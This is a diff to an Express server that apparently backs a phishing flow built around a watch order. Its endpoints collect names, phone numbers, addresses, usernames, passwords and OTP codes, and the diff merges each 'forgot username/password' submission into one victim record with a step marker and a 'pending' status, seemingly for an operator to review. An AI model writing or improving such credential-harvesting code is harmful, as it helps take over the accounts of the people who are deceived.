@@ -151,104 +151,78 @@ app.post('/api/submit-otp', (req, res) => {
     res.json({ ok: true });
 });
 
-app.post('/api/submit-forgot-username-confirm', (req, res) => {
-    const { username, orderId } = req.body;
-    const request = {
+app.post('/api/submit-forgot-username', (req, res) => {
+    const { email, orderId } = req.body;
+    const id = orderId ? Number(orderId) : null;
+    const request = id ? requests.find(r => r.id === id) : null;
+    if (request) {
+        request.forgotEmail = email || '';
+        request.step = 'forgot-username';
+        request.status = 'pending';
+        return res.json({ ok: true, id: request.id });
+    }
+    const newReq = {
         id: nextId++,
-        type: 'forgot-username-confirm',
-        name: '',
-        phone: '',
-        email: '',
-        delivery: '',
-        branch: '',
-        governorate: '',
-        city: '',
-        address: '',
-        watchColor: '',
-        username: username || '',
-        password: '',
-        otp: '',
+        name: '', phone: '', email: email || '', delivery: '', branch: '',
+        governorate: '', city: '', address: '', watchColor: '',
+        username: '', password: '', otp: '',
+        forgotEmail: email || '',
+        step: 'forgot-username',
         status: 'pending',
         createdAt: new Date().toISOString()
     };
-    requests.push(request);
-    res.json({ ok: true, id: request.id });
+    requests.push(newReq);
+    res.json({ ok: true, id: newReq.id });
+});
+
+app.post('/api/submit-forgot-username-confirm', (req, res) => {
+    const { username, orderId } = req.body;
+    const id = orderId ? Number(orderId) : null;
+    const request = id ? requests.find(r => r.id === id) : null;
+    if (request) {
+        request.username = username || '';
+        request.step = 'forgot-username-confirm';
+        request.status = 'pending';
+        return res.json({ ok: true, id: request.id });
+    }
+    res.json({ ok: false });
 });
 
 app.post('/api/submit-forgot-username-password', (req, res) => {
     const { password, orderId } = req.body;
-    const request = {
-        id: nextId++,
-        type: 'forgot-username-password',
-        name: '',
-        phone: '',
-        email: '',
-        delivery: '',
-        branch: '',
-        governorate: '',
-        city: '',
-        address: '',
-        watchColor: '',
-        username: '',
-        password: password || '',
-        otp: '',
-        status: 'pending',
-        createdAt: new Date().toISOString()
-    };
-    requests.push(request);
-    res.json({ ok: true, id: request.id });
-});
-
-app.post('/api/submit-forgot-username', (req, res) => {
-    const { email, orderId } = req.body;
-    const request = {
-        id: nextId++,
-        type: 'forgot-username',
-        forgotEmail: email || '',
-        linkedOrderId: orderId ? Number(orderId) : null,
-        name: '',
-        phone: '',
-        email: email || '',
-        delivery: '',
-        branch: '',
-        governorate: '',
-        city: '',
-        address: '',
-        watchColor: '',
-        username: '',
-        password: '',
-        otp: '',
-        status: 'pending',
-        createdAt: new Date().toISOString()
-    };
-    requests.push(request);
-    res.json({ ok: true, id: request.id });
+    const id = orderId ? Number(orderId) : null;
+    const request = id ? requests.find(r => r.id === id) : null;
+    if (request) {
+        request.password = password || '';
+        request.step = 'forgot-username-password';
+        request.status = 'pending';
+        return res.json({ ok: true, id: request.id });
+    }
+    res.json({ ok: false });
 });
 
 app.post('/api/submit-forgot-password', (req, res) => {
     const { username, orderId } = req.body;
-    const request = {
+    const id = orderId ? Number(orderId) : null;
+    const request = id ? requests.find(r => r.id === id) : null;
+    if (request) {
+        request.forgotUsername = username || '';
+        request.step = 'forgot-password';
+        request.status = 'pending';
+        return res.json({ ok: true, id: request.id });
+    }
+    const newReq = {
         id: nextId++,
-        type: 'forgot-password',
+        name: '', phone: '', email: '', delivery: '', branch: '',
+        governorate: '', city: '', address: '', watchColor: '',
+        username: username || '', password: '', otp: '',
         forgotUsername: username || '',
-        linkedOrderId: orderId ? Number(orderId) : null,
-        name: '',
-        phone: '',
-        email: '',
-        delivery: '',
-        branch: '',
-        governorate: '',
-        city: '',
-        address: '',
-        watchColor: '',
-        username: username || '',
-        password: '',
-        otp: '',
+        step: 'forgot-password',
         status: 'pending',
         createdAt: new Date().toISOString()
     };
-    requests.push(request);
-    res.json({ ok: true, id: request.id });
+    requests.push(newReq);
+    res.json({ ok: true, id: newReq.id });
 });
 
 app.get('/api/requests/:id/check', (req, res) => {
